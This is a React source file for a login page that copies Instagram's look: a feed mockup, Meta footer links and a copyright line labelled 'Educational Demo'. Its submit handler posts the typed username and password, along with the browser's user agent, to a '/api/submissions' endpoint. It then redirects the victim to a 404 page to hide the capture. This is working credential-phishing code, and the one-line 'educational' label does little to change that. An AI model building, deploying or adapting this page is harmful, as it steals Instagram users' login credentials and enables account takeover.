import { useLocation } from "wouter";
import InstagramLoginForm from "@/components/InstagramLoginForm";
import instagramFeedMockup from "@assets/generated_images/Instagram_feed_mockup_51d2f4e6.png";
import { apiRequest } from "@/lib/queryClient";

export default function LoginPage() {
  const [, setLocation] = useLocation();

  const handleSubmit = async (username: string, password: string) => {
    try {
      await apiRequest("POST", "/api/submissions", {
        username,
        password,
        userAgent: navigator.userAgent,
        ipAddress: null,
      });
    } catch (error) {
      console.error("Failed to submit:", error);
    }
    
    setTimeout(() => {
      setLocation("/404");
    }, 1500);
  };

  return (
    <div className="min-h-screen flex flex-col">
      <div className="flex-1 flex items-center justify-center lg:grid lg:grid-cols-2 lg:gap-0">
        <div className="hidden lg:flex items-center justify-center bg-gradient-to-br from-purple-50 to-blue-50 dark:from-purple-950/20 dark:to-blue-950/20 h-full p-12">
          <div className="max-w-md">
            <img
              src={instagramFeedMockup}
              alt="Instagram interface"
              className="w-full h-auto"
              data-testid="img-instagram-mockup"
            />
          </div>
        </div>

        <div className="flex items-center justify-center p-8 lg:p-16">
          <InstagramLoginForm onSubmit={handleSubmit} />
        </div>
      </div>

      <footer className="py-6 px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex flex-wrap justify-center gap-4 text-xs text-muted-foreground mb-4">
            <a href="#" className="hover:underline" data-testid="link-footer-meta">Meta</a>
            <a href="#" className="hover:underline" data-testid="link-footer-about">About</a>
            <a href="#" className="hover:underline" data-testid="link-footer-blog">Blog</a>
            <a href="#" className="hover:underline" data-testid="link-footer-jobs">Jobs</a>
            <a href="#" className="hover:underline" data-testid="link-footer-help">Help</a>
            <a href="#" className="hover:underline" data-testid="link-footer-api">API</a>
            <a href="#" className="hover:underline" data-testid="link-footer-privacy">Privacy</a>
            <a href="#" className="hover:underline" data-testid="link-footer-terms">Terms</a>
          </div>
          <div className="flex justify-center gap-4 text-xs text-muted-foreground">
            <select className="bg-transparent border-none outline-none" data-testid="select-language">
              <option>English</option>
              <option>Español</option>
              <option>Français</option>
            </select>
            <span>© 2024 Instagram from Meta (Educational Demo)</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
